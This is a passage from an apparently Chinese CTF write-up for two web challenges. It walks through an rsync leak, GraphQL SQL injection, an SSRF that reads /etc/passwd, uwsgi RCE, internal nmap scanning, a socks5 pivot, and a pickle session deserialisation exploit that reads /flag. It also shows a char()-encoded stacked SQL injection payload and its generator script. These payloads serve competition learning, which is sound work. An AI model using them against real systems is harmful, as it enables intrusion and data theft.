class="line">https://qqwwwwbbbbb.52dandan.xyz:8088/</span><br></pre></td></tr></table></figure></p><p>发现现在正常访问，但是页面404。进行信息搜集，扫端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">22/tcp    open   ssh</span><br><span class="line">873/tcp   open   rsync</span><br><span class="line">3389/tcp  closed ms-wbt-server</span><br><span class="line">8080/tcp  closed http-proxy</span><br><span class="line">8088/tcp  open   radan-http</span><br><span class="line">12345/tcp closed netbus</span><br><span class="line">31337/tcp closed Elite</span><br></pre></td></tr></table></figure></p><p>发现837端口开放，尝试未授权访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsync 49.4.71.212::</span><br><span class="line">rsync 49.4.71.212::&quot;src&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-26-16-25-33.png" alt=""><br>下载backup_old.zip<br><img src="/images/2019-05-26-16-26-08.png" alt=""><br>获得外网源码，审计一波，发现是用flask写的小站，首先看下路由：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.register_blueprint(admin, url_prefix=<span class="string">'/admin'</span>)</span><br><span class="line">app.register_blueprint(graphql, url_prefix=<span class="string">'/graphql_test123'</span>)</span><br><span class="line">app.register_blueprint(login_blue, url_prefix=<span class="string">'/user'</span>)</span><br><span class="line">app.register_blueprint(user, url_prefix=<span class="string">'/user'</span>)</span><br></pre></td></tr></table></figure></p><p>同时看到登录页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://qqwwwwbbbbb.52dandan.xyz:8088/user/login</span><br></pre></td></tr></table></figure></p><p>审计相关代码：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> re.match(<span class="string">"^[A-Za-z0-9]*$"</span>, username):</span><br><span class="line">    sql = <span class="string">"select * from user where username_which_you_do_not_know=\"&#123;&#125;\" and password_which_you_do_not_know_too=\"&#123;&#125;\""</span>.format(username,password_new)</span><br></pre></td></tr></table></figure></p><p>发现有过滤，且有功能需要登录<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@user.route('/newimg', methods=['POST','GET'])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    url = unquote(request.form.get(<span class="string">'newurl'</span>))</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">"^[A-Za-z0-9-_%:./]*$"</span>,url):</span><br><span class="line">        filename = ramdom_str()</span><br><span class="line">        command = <span class="string">"curl &#123;&#125; &gt; /tmp/&#123;&#125;"</span>.format(url, filename)</span><br><span class="line">        os.system(command)</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"/tmp/&#123;&#125;"</span>.format(filename),<span class="string">"rb"</span>) <span class="keyword">as</span> res:</span><br><span class="line">            res_data = res.read()</span><br><span class="line">            res_data = base64.b64encode(res_data)</span><br><span class="line">            <span class="keyword">return</span> res_data</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span></span><br></pre></td></tr></table></figure></p><p>若要利用该SSRF进行任意文件读取，那么必须要登录，但是没有注册功能，那么猜想需要注入，于是寻找注入点，发现：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Test_schema = graphene.Schema(query=Test)</span><br><span class="line">Login_schema = graphene.Schema(query=Login)</span><br><span class="line">graphql.add_url_rule(<span class="string">'/test'</span>, view_func=GraphQLView.as_view(<span class="string">'test'</span>, schema=Test_schema, graphiql=<span class="keyword">True</span>))</span><br><span class="line">graphql.add_url_rule(<span class="string">'/login'</span>, view_func=GraphQLView.as_view(<span class="string">'login'</span>, schema=Login_schema, graphiql=<span class="keyword">True</span>))</span><br></pre></td></tr></table></figure></p><p>尝试访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://qqwwwwbbbbb.52dandan.xyz:8088/graphql_test123/login</span><br></pre></td></tr></table></figure></p><p>其对应代码如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span><span class="params">(graphene.ObjectType)</span>:</span></span><br><span class="line">    recv = graphene.String(data=graphene.String(default_value=<span class="string">""</span>))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">resolve_recv</span><span class="params">(self,info, data)</span>:</span></span><br><span class="line">        all_info = json.loads(data)</span><br><span class="line">        operate = all_info[<span class="string">'operate'</span>]</span><br><span class="line">        <span class="keyword">if</span> operate ==<span class="string">'login'</span>:</span><br><span class="line">            username = all_info[<span class="string">'username'</span>]</span><br><span class="line">            password = all_info[<span class="string">'password'</span>]</span><br><span class="line">            logggin(username,password)</span><br><span class="line">            password_new = hashlib.sha256(password.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">            db = DbOp()</span><br><span class="line">            db.connect()</span><br><span class="line">            sql = <span class="string">"select * from user where username_which_you_do_not_know=\"&#123;&#125;\" and password_which_you_do_not_know_too=\"&#123;&#125;\""</span>.format(username,password_new)</span><br><span class="line">            rr = db.getall(sql)</span><br><span class="line">            <span class="keyword">if</span> len(rr) != <span class="number">0</span>:</span><br><span class="line">                session[<span class="string">'username'</span>] = username</span><br><span class="line">                session[<span class="string">'loginstatus'</span>] = <span class="keyword">True</span></span><br><span class="line">            response = <span class="string">"login success"</span></span><br><span class="line">        <span class="keyword">elif</span> operate == <span class="string">'logout'</span>:</span><br><span class="line">            session[<span class="string">'username'</span>] = <span class="keyword">None</span></span><br><span class="line">            session[<span class="string">'loginstatus'</span>] = <span class="keyword">False</span></span><br><span class="line">            response = <span class="string">"Logout success"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            response = <span class="string">"None of operate"</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure></p><p>发现是graphql且无过滤，利用如下操作，可控username与password:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recv = graphene.String(data=graphene.String(default_value=<span class="string">""</span>))</span><br></pre></td></tr></table></figure></p><p>审计发现需要满足:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> operate ==<span class="string">'login'</span>:</span><br></pre></td></tr></table></figure></p><p>于是构造如下json:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array = <span class="keyword">array</span>(<span class="string">'operate'</span>=&gt;<span class="string">'login'</span>,<span class="string">'username'</span>=&gt;<span class="string">'admin'</span>,<span class="string">'password'</span>=&gt;<span class="string">'admin'</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode($array);</span><br></pre></td></tr></table></figure></p><p>尝试访问：<br><img src="/images/2019-05-26-16-33-34.png" alt=""><br>发现可以成功进行登录，那么简单注入：<br><img src="/images/2019-05-26-16-34-56.png" alt=""><br>发现登录成功，成功拿到session，于是利用路由进行SSRF:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://qqwwwwbbbbb.52dandan.xyz:8088/user/newimg</span><br></pre></td></tr></table></figure></p><p>尝试读取/etc/passwd文件：<br><img src="/images/2019-05-26-16-37-31.png" alt=""><br>发现读取成功，尝试读nginx相关配置信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure></p><p>得到信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">     listen 80  default_server;</span><br><span class="line">     listen 443 default_server;</span><br><span class="line">     server_name _ ;</span><br><span class="line">     ssl on;</span><br><span class="line">     ssl_certificate     /root/www.crt;</span><br><span class="line">     ssl_certificate_key /root/www.key;</span><br><span class="line">     return 444;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    listen 443;</span><br><span class="line">    server_name qqwwwwbbbbb.52dandan.xyz;</span><br><span class="line">    charset utf-8;</span><br><span class="line">    client_max_body_size 5M;</span><br><span class="line">    location / &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass 127.0.0.1:3031;</span><br><span class="line">    &#125;</span><br><span class="line">    location /static &#123;</span><br><span class="line">        alias /home/qwb/static;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现uwsgi<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:3031;</span><br></pre></td></tr></table></figure></p><p>结合参考文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md</span><br></pre></td></tr></table></figure></p><p>不难想到这里可以利用SSRF打uwsgi进行getshell：<br><img src="/images/2019-05-26-16-50-49.png" alt=""><br>然后下一步理所当然是扫内网，这里我传了个nmap上去一通扫：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 172.16.17.1</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">Not shown: 310 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">873/tcp  open  rsync</span><br><span class="line">8088/tcp open  omniorb</span><br><span class="line"></span><br><span class="line">Nmap scan report for 2019qwb_qwb_flask_socks5_1.2019qwb_qwb_network (172.16.17.4)</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 312 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">1080/tcp open  socks</span><br><span class="line"></span><br><span class="line">Nmap scan report for 96b479690d75 (172.16.17.22)</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">Not shown: 311 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br><span class="line"></span><br><span class="line">Nmap scan report for 2019qwb_qwb_rsync_1.2019qwb_qwb_network (172.16.17.99)</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">Not shown: 312 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">873/tcp open  rsync</span><br><span class="line"></span><br><span class="line">Nmap scan report for 2019qwb_qwb_ssrf_mysql_1.2019qwb_qwb_network (172.16.17.231)</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">Not shown: 312 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">3306/tcp open  mysql</span><br></pre></td></tr></table></figure></p><p>看到数据库后，简单找了下数据库信息:<br><img src="/images/2019-05-26-16-53-34.png" alt=""><br>尝试连接数据库：<br><img src="/images/2019-05-26-16-55-12.png" alt=""><br>顺手看了下内容：<br><img src="/images/2019-05-26-16-55-53.png" alt=""><br>没有flag，惨惨= =，后来正想扫其他网段的时候，主办方放出了hint:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于内网扫的太卡了，直接给出内网地址192.168.223.222</span><br></pre></td></tr></table></figure></p><p>同时发现之前的扫描结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 2019qwb_qwb_flask_socks5_1.2019qwb_qwb_network (172.16.17.4)</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 312 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">1080/tcp open  socks</span><br></pre></td></tr></table></figure></p><p>想到可以用socks5去打内网，于是简单配置了下代理，顺手扫了个端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.223.222</span><br><span class="line">Host is up (0.064s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br></pre></td></tr></table></figure></p><p>那就是打web了，浏览器挂上代理访问，来到内网web页面<br><img src="/images/2019-05-26-16-59-11.png" alt=""><br>随手尝试弱密码登录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin admin</span><br></pre></td></tr></table></figure></p><p>又来到一个全新的世界= =<br><img src="/images/2019-05-26-17-03-51.png" alt=""><br>发现有几个功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add user</span><br><span class="line">save log</span><br><span class="line">infomation</span><br></pre></td></tr></table></figure></p><p>然后陷入了无尽的沉思= =，后来主办方给出了个hint，也就是公开源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:https://paste.ubuntu.com/p/q4xJBfm3Bb/</span><br></pre></td></tr></table></figure></p><p>简单审计后，发现序列化点：<br>反序列化操作：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_session</span><span class="params">(self, app, request)</span>:</span></span><br><span class="line">    sid = request.cookies.get(app.session_cookie_name)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sid:</span><br><span class="line">        sid = self._generate_sid()</span><br><span class="line">        <span class="keyword">return</span> self.session_class(sid=sid)</span><br><span class="line"></span><br><span class="line">    signer = self._get_signer(app)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sid_as_bytes = signer.unsign(sid)</span><br><span class="line">        sid = sid_as_bytes.decode()</span><br><span class="line">    <span class="keyword">except</span> BadSignature:</span><br><span class="line">        sid = self._generate_sid()</span><br><span class="line">        <span class="keyword">return</span> self.session_class(sid=sid)</span><br><span class="line"></span><br><span class="line">    sess_path = os.path.join(sys.path[<span class="number">0</span>],self.dir)</span><br><span class="line">    exists = os.path.exists(sess_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exists:</span><br><span class="line">        os.mkdir(sess_path)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(os.path.join(sess_path,sid),<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                val = pickle.load(f)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                val = &#123;&#125;</span><br><span class="line">            <span class="keyword">return</span> self.session_class(val,sid=sid)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> self.session_class(sid=sid)</span><br></pre></td></tr></table></figure></p><p>序列化操作：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_session</span><span class="params">(self, app, session, response)</span>:</span></span><br><span class="line">    domain = self.get_cookie_domain(app)</span><br><span class="line">    path = self.get_cookie_path(app)</span><br><span class="line">    httponly = self.get_cookie_httponly(app)</span><br><span class="line">    secure = self.get_cookie_secure(app)</span><br><span class="line">    expires = self.get_expiration_time(app, session)</span><br><span class="line">    val = dict(session)</span><br><span class="line"></span><br><span class="line">    sess_path = os.path.join(sys.path[<span class="number">0</span>],self.dir)</span><br><span class="line">    <span class="keyword">with</span> open(os.path.join(sess_path , session.sid), <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pickle.dump(val, f, <span class="keyword">True</span>)</span><br><span class="line">    session_id = self._get_signer(app).sign(want_bytes(session.sid))</span><br><span class="line">    response.set_cookie(app.session_cookie_name, session_id,</span><br><span class="line">                        expires=expires, httponly=httponly,</span><br><span class="line">                        domain=domain, path=path, secure=secure)</span><br></pre></td></tr></table></figure></p><p>注：怎么每年都有个flask session反序列化= =<br>本来想利用序列化反弹shell，但主办方又给个hint：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不能弹shell的。。。别尝试了</span><br></pre></td></tr></table></figure></p><p>注：主办方真给力，每次都雪中送炭）<br>于是考虑怎么把数据带出，但考虑到内网的交互问题有点麻烦，于是想直接把flag放进session里。<br>那么容易想到将flag替换username的值，然后在带出session username的位置即可看到flag。<br>根据代码<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate_username</span><span class="params">(self, field)</span>:</span></span><br><span class="line">    name = field.data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> re.match(<span class="string">'^[0-9a-zA-Z]*$'</span>,name)) <span class="keyword">or</span> (len(name)&lt;<span class="number">6</span>) :</span><br><span class="line">        err_log.append(waf(field.data))</span><br><span class="line">        <span class="keyword">if</span> len(err_log) == <span class="number">101</span>:</span><br><span class="line">            err_log.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">raise</span> ValidationError(<span class="string">'validation username!'</span>)</span><br></pre></td></tr></table></figure></p><p>发现用户名只要出现特殊符号，就会经过waf后被加入log：<br>观察waf：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(data)</span>:</span></span><br><span class="line">    data = re.sub(<span class="string">'(decode|sh|command|class|dict|base|execfile|timeit|platform|getattribute|reload|values)'</span>,<span class="string">'hacker'</span>,data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure></p><p>过滤并不是非常多，触发过滤会被替换为hacker，还是挺好Bypass的。<br>那么思路非常明确了，我们希望达成如下效果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes(&apos;(dp0\nS\&apos;username\&apos;\np1\nS\&apos;&apos;+open(&apos;/tmp/flag&apos;,&apos;r&apos;).read().strip()+&apos;\&apos;\np2\ns.&apos;,&apos;utf-8&apos;)</span><br></pre></td></tr></table></figure></p><p>该exp被反序列化后，效果如下：<br><img src="/images/2019-05-26-18-30-30.png" alt=""><br>此时我们的username的值变为flag<br>同时寻找读取内容位置：<br><img src="/images/2019-05-26-17-18-05.png" alt=""><br>发现在information处，会有<code>session[&#39;username&#39;]</code>，那么即可完成攻击链，我们构造出关键exp：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"open('/home/qwb/session/ba0eaa4d-7f63-41b5-8d05-cce9b1299945','wb').write(bytes('(dp0\\nS\\'username\\'\\np1\\nS\\''+open('/flag','r').read().strip()+'\\'\\np2\\ns.','utf-8'))"</span></span><br></pre></td></tr></table></figure></p><p>将其序列化后，放在add user位置，使其进入log。<br>之后利用save_log将日志覆盖到session文件上，再通过触发session，触发反序列化。<br>其中注意，save log对路径做了过滤，可以用反斜杠进行bypass：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate_filepath</span><span class="params">(self, field)</span>:</span></span><br><span class="line">    filepath = field.data</span><br><span class="line">    <span class="keyword">if</span>  re.match(<span class="string">'.*(\./|\.\./|/).*'</span>,filepath) <span class="keyword">or</span> re.match(<span class="string">'(.*\.py|.*\.pyc|.*\.js|.*\.html|.*\.css|.*\.db)'</span>,filepath):</span><br><span class="line">        <span class="keyword">raise</span> ValidationError(<span class="string">'validation filepath!'</span>)</span><br></pre></td></tr></table></figure></p><p>攻击后访问information页面，发现flag：<br><img src="/images/2019-05-26-16-12-47.png" alt=""></p><h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><p>一道相对简单的注入题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.26.104:32019/?inject=1</span><br></pre></td></tr></table></figure></p><p>随手尝试引号，得到报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos;1&apos;&apos;&apos; at line 1</span><br></pre></td></tr></table></figure></p><p>再尝试闭合<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.26.104:32019/?inject=1&apos;%23</span><br></pre></td></tr></table></figure></p><p>发现正常，于是尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.26.104:32019/?inject=1&apos;||1%23</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-26-18-15-51.png" alt=""><br>发现列出当前表所有内容，猜想flag在其他表中，尝试注入，发现过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;, $inject);</span><br></pre></td></tr></table></figure></p><p>发现<code>select</code>和<code>.</code>被过滤，根据经验，一般这种情况很难跨表查询，那么考虑有没有其他的技巧，不难想到堆叠注入，为bypass过滤，尝试用char进行绕过，可写出exp如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"0';set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;"</span></span><br><span class="line">exp = <span class="string">'select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()'</span></span><br><span class="line"><span class="comment"># exp = "select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='1919810931114514'"</span></span><br><span class="line"><span class="comment"># exp = "select flag from `1919810931114514`"</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> exp:</span><br><span class="line">res += <span class="string">"char(%s),"</span>%(ord(i))</span><br><span class="line">my_payload = payload%(res[:<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">print</span> my_payload</span><br></pre></td></tr></table></figure></p><p>在本地略作尝试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from article where id=1;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(103),char(114),char(111),char(117),char(112),char(95),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(84),char(65),char(66),char(76),char(69),char(95),char(78),char(65),char(77),char(69),char(41),char(32),char(102),char(114),char(111),char(109),char(32),char(105),char(110),char(102),char(111),char(114),char(109),char(97),char(116),char(105),char(111),char(110),char(95),char(115),char(99),char(104),char(101),char(109),char(97),char(46),char(84),char(65),char(66),char(76),char(69),char(83),char(32),char(119),char(104),char(101),char(114),char(101),char(32),char(84),char(65),char(66),char(76),char(69),char(95),char(83),char(67),char(72),char(69),char(77),char(65),char(61),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41));PREPARE a FROM @s;EXECUTE a;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-26-18-19-23.png" alt=""><br>发现一切顺利，于是题目中进行测试：<br>发现表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(103),char(114),char(111),char(117),char(112),char(95),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(84),char(65),char(66),char(76),char(69),char(95),char(78),char(65),char(77),char(69),char(41),char(32),char(102),char(114),char(111),char(109),char(32),char(105),char(110),char(102),char(111),char(114),char(109),char(97),char(116),char(105),char(111),char(110),char(95),char(115),char(99),char(104),char(101),char(109),char(97),char(46),char(84),char(65),char(66),char(76),char(69),char(83),char(32),char(119),char(104),char(101),char(114),char(101),char(32),char(84),char(65),char(66),char(76),char(69),char(95),char(83),char(67),char(72),char(69),char(77),char(65),char(61),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41));PREPARE a FROM @s;EXECUTE a;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-26-18-20-39.png" alt=""><br>发现字段名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;;set 